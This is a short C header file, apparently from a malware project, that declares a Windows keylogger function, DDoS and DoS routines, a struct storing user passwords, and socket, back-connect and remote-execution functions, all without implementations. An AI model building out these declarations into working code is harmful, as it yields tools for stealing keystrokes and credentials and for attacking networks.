#ifndef CXENON_H
#define CXENON_H

#include <../Include/driver/socket.h>

#if defined(_WIN32)

int WININIT(void);

char* keylogger(void);
void DDOS(void);
void DOS(void);

enum USTATUS
{

	ONLINE,
	OFFLINE,
	UNKNOWN

};

typedef struct
{

	char password[255];
	enum USTATUS STATUS;

} userinfo;

#endif


SOCKET client_socket(void);
int clientBC(void);
int rexec(void);

#endif